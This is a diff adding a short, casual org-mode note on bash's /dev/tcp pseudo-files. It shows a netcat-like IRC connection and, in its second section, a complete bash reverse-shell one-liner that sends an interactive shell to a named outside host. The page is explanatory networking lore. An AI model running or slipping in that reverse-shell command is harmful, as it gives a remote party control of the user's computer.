@@ -1,0 +1,21 @@
+#+TITLE: /dev/tcp shenanigans
+#+SETUPFILE: setupfile.org
+
+bash pretends weird files in ~/dev/tcp/<hostname>/<port>~ exist,
+allowing outgoing tcp connections without the need for external
+utilities. however, their usefulness is limited, as actual programs
+cannot access these fake files without the help of shell redirects.
+
+* using like netcat
+#+begin_example
+exec 926<>/dev/tcp/vulpineawoo.cheapiesystems.com/6667
+cat <&926 & cat >&926
+#+end_example
+will connect you to irc (after manually registering and possibly
+solving a ping-cookie, of course)
+
+* using as a reverse-shell
+#+begin_example
+bash -i >& /dev/tcp/noisytoot.org/1337 0>&1
+#+end_example
+will give noisytoot shell access to your computer.
